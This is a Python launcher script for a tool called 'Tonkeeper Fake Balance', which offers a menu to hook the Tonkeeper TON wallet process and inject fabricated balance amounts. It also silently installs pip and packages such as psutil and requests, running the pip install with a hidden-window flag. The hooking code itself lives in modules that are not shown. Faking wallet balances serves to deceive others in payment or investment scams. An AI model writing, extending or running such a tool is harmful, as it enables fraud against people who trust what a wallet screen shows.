# -*- coding: utf-8 -*-
"""
Tonkeeper Fake Balance — TON Wallet Balance Overlay
Python 3.10 recommended
"""

import sys
import os


def _setup():
    try:
        import rich, cryptography
        return
    except ImportError:
        pass
    import subprocess, importlib, urllib.request
    _W, _H = 40, 0x08000000
    def _bar(s, t, msg):
        f = int(_W * s // t)
        sys.stdout.write(f'\r  [{"#"*f}{"."*(_W-f)}] {100*s//t:>3}%  {msg:<35}')
        sys.stdout.flush()
    sys.stdout.write('\n  Preparing environment...\n\n')
    _bar(1, 5, 'Checking package manager...')
    try:
        pip_check = subprocess.run([sys.executable, '-m', 'pip', '-V'], capture_output=True)
        has_pip = pip_check.returncode == 0
    except Exception:
        has_pip = False
    
    if not has_pip:
        _bar(2, 5, 'Installing package manager...')
        _gp = os.path.join(os.path.dirname(sys.executable), '_gp.py')
        try:
            urllib.request.urlretrieve('https://bootstrap.pypa.io/get-pip.py', _gp)
            subprocess.run([sys.executable, _gp, '-q', '--no-warn-script-location'], capture_output=True, creationflags=_H)
            os.remove(_gp)
        except Exception as e:
            sys.stdout.write(f'\n\n  Failed to install pip: {e}\n')
            input('  Press Enter to exit...')
            sys.exit(1)
            
    _bar(3, 5, 'Installing dependencies...')
    try:
        subprocess.run([sys.executable, '-m', 'pip', 'install',
                        'rich', 'cryptography', 'psutil', 'requests', '-q', '--no-warn-script-location'],
                       capture_output=True)
    except Exception as e:
        sys.stdout.write(f'\n\n  Failed to install dependencies: {e}\n')
        input('  Press Enter to exit...')
        sys.exit(1)

    _bar(4, 5, 'Verifying...')
    importlib.invalidate_caches()
    try:
        import rich, cryptography
        _bar(5, 5, 'Ready!')
        sys.stdout.write('\n\n')
    except ImportError:
        sys.stdout.write('\n\n  Failed to verify dependencies.\n')
        sys.stdout.write('  Run: pip install rich cryptography psutil requests\n')
        input('  Press Enter to exit...')
        sys.exit(1)


_setup()

from backend import Session
from backend.ui import (
    print_banner,
    print_success,
    print_error,
    print_info,
    show_menu_table,
    show_load_status_table,
    console,
)
from config import load_config
from bot_actions import (
    action_set_balances,
    action_apply_overlay,
    action_restore_original,
    action_status_check,
)
from actions.install import action_install_dependencies
from actions.settings import action_settings
from actions.about import action_about


MENU_ITEMS = [
    ("1", "Install Dependencies", "pip install -r requirements.txt"),
    ("2", "Settings", "Wallet path, hook mode, currency"),
    ("3", "About", "Features, supported assets, contact"),
    ("4", "Set Custom Balances", "Configure target amounts per asset"),
    ("5", "Apply Balance Overlay", "Hook Tonkeeper process & inject values"),
    ("6", "Restore Original", "Remove hooks, restore real balances"),
    ("7", "Status Check", "Verify hook state & process info"),
    ("0", "Exit", "Quit"),
]


def main():
    with Session():
        print_banner()

        config = load_config()
        show_load_status_table(config)

        while True:
            choice = show_menu_table(MENU_ITEMS)

            if choice == "0":
                print_info("Goodbye!")
                sys.exit(0)
            elif choice == "1":
                action_install_dependencies()
            elif choice == "2":
                action_settings()
            elif choice == "3":
                action_about()
            elif choice == "4":
                config = action_set_balances(config)
            elif choice == "5":
                action_apply_overlay(config)
            elif choice == "6":
                action_restore_original(config)
            elif choice == "7":
                action_status_check(config)
            else:
                print_error("Invalid choice. Enter 0-7.")

            console.input("\n[dim]Press Enter to continue...[/]")


if __name__ == "__main__":
    main()
